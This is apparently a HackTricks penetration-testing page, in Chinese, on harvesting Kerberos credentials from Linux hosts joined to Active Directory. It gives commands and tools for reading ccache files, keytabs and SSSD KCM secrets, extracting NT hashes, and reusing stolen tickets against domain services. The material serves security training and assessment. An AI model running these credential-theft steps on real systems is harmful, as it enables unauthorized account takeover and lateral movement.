# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux machine 也可以存在于 Active Directory 环境中。

AD 中的 Linux machine 可以在本地**存储 Kerberos material**：user ccache、machine/service keytab 以及 SSSD 管理的 secrets。这些 artefacts 通常可以像其他 Kerberos credential 一样被复用。要读取其中大多数内容，你需要是 ticket 的用户所有者，或者是该 machine 上的 **root**。

## Enumeration

### 从 Linux 进行 AD enumeration

如果你可以从 Linux 上访问 AD（或在 Windows 中使用 bash），可以尝试 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) 来 enumeration AD。

你也可以查看以下页面，了解**从 Linux enumeration AD 的其他方式**：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA 是 Microsoft Windows **Active Directory** 的开源**替代方案**，主要用于 **Unix** 环境。它将完整的 **LDAP directory** 与 MIT **Kerberos** Key Distribution Center 相结合，提供类似 Active Directory 的管理功能。它使用 Dogtag **Certificate System** 进行 CA 和 RA certificate 管理，并支持包括 smartcard 在内的**多因素** authentication。SSSD 已集成用于 Unix authentication 流程。请在以下页面了解更多信息：


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### 已加入域的 host artefacts

在处理 tickets 之前，先确定 **host 是如何加入 AD 的**，以及 **Kerberos material 实际存储在哪里**。在现代 Linux host 上，这通常由 `realmd` + `adcli` + `sssd` 处理，而不只是存储在 `/tmp` 中的普通文件：
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
这可以快速告诉你该主机是否信任 AD、SSSD 是否正在缓存 identities 或 tickets，以及是否存在可被滥用的 **machine/service keytabs** 或 **KCM secrets**。

## Playing with tickets

### Pass The Ticket

在本页中，你将找到 Linux 主机内可能**发现 Kerberos tickets 的不同位置**；在下方页面中，你可以了解如何将这些 CCache ticket 格式转换为 Kirbi（在 Windows 中使用所需的格式），以及如何执行 PTT attack：


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

如果你需要了解 **Linux-specific ticket harvesting workflows**（`FILE`、`DIR`、`KEYRING`、`KCM`、`/proc` 等），请查看专门的页面：

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files 是用于**存储 Kerberos credentials** 的 binary formats。`FILE:/tmp/krb5cc_%{uid}` 仍然很常见，但现代 Linux deployments 也会使用 `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}` 或 `KCM:%{uid}`。在假设 tickets 位于 `/tmp` 之前，请检查 **`KRB5CCNAME`** environment variable 和 `default_ccache_name` setting。<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### 从 keyring 重用 CCACHE ticket

**存储在进程内存中的 Kerberos tickets 可以被提取**，尤其是在禁用主机 ptrace 保护时（`/proc/sys/kernel/yama/ptrace_scope`）。用于此目的的一个实用工具位于 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)，它通过注入 sessions 并将 tickets dump 到 `/tmp` 来完成提取。

要配置和使用此工具，请按照以下步骤操作：
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
此过程将尝试注入各种 sessions，并通过将提取的 tickets 按 `__krb_UID.ccache` 的命名约定存储在 `/tmp` 中来表示成功。<sup>[[1]](#references)</sup>

### 从 SSSD KCM 重用 CCACHE ticket

SSSD 会在路径 `/var/lib/sss/secrets/secrets.ldb` 中维护数据库副本。对应的 key 存储为路径 `/var/lib/sss/secrets/.secrets.mkey` 下的隐藏文件。默认情况下，只有拥有 **root** 权限时才能读取该 key。

使用 **`SSSDKCMExtractor`** 及其 --database 和 --key 参数将解析数据库并**解密 secrets**。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob 可以转换为可用的 Kerberos CCache** 文件，并传递给 Mimikatz/Rubeus。

### 快速 keytab 初步分析
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### 从 /etc/krb5.keytab 提取账户

服务账户密钥对于以 root 权限运行的服务至关重要，并安全存储在 **`/etc/krb5.keytab`** 文件中。这些密钥相当于服务的密码，必须严格保密。

可以使用 **`klist`** 检查 keytab 文件的内容。在 Linux 上，`klist -k -K -e` 会打印 principals、密钥版本号、加密类型以及原始密钥材料。如果密钥类型为 **23 / RC4-HMAC**，则密钥值同时也是该 principal 的 **NT hash**。
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
对于 Linux 用户，**`KeyTabExtract`** 提供提取 RC4 HMAC hash 的功能，可用于 NTLM hash reuse。请注意，只有当 keytab 仍包含 **etype 23 / RC4-HMAC** material 时，这才有帮助。在 **AES-only** 环境中，你可能无法获得可复用的 NT hash，但仍可通过 Kerberos 使用 keytab 直接进行 authentication。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
在 macOS 上，**`bifrost`** 可用于 keytab 文件分析。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
利用提取的账户和 hash 信息，可以使用 **`NetExec`** 等 tools 与服务器建立连接。
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Reuse the machine account from `/etc/krb5.keytab`

在通过 `realmd`/`adcli`/`sssd` 加入域的系统上，`/etc/krb5.keytab` 通常包含**计算机账户**以及一个或多个**主机/服务 principal**。如果你拥有 **root** 权限，不要直接 dump 它：使用 `klist -k` 列出的某个 principal 请求 TGT，并以 Linux 主机自身的身份进行操作。
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
这在 **computer object** 本身在 AD 中具有 delegated rights，或者主机被允许检索其他 secrets（例如 **gMSA**）时尤其有用。

### 使用 Linux-first AD tooling 重用窃取的 Kerberos material

一旦获得有效的 `ccache` 或可用的 keytab，就可以**直接从 Linux**对 AD 执行操作，而无需先将所有内容转换为 Windows 格式。许多现代工具原生接受 `KRB5CCNAME` / Kerberos auth：
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
这是连接 **Linux post-exploitation** 与 **AD object abuse** 的良好桥梁。关于对象级 abuse 路径本身，请查看：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

近期的 Linux 部署可以直接从 AD 使用 **Managed Service Accounts**。在实践中，这意味着在攻陷 Linux 服务器后，你可能不仅会找到主机 keytab，还可能找到由 gMSA 生成的**特定服务 keytab**。常见的检查位置包括 `/etc/gmsad.conf`、部署专用的配置文件，以及 `/etc` 下其他的 `*.keytab` 文件。<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
这为绑定到该 gMSA 的 SPN 提供了一个可复用的 Kerberos identity，**无需接触任何 Windows endpoint**。如果你在 AD 中获得更高权限后需要进行**域侧** gMSA/dMSA abuse，请查看：

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos（II）：如何攻击 Kerberos？](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [使用 managed service account 访问 AD - 将 RHEL 系统直接与 Active Directory 集成](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
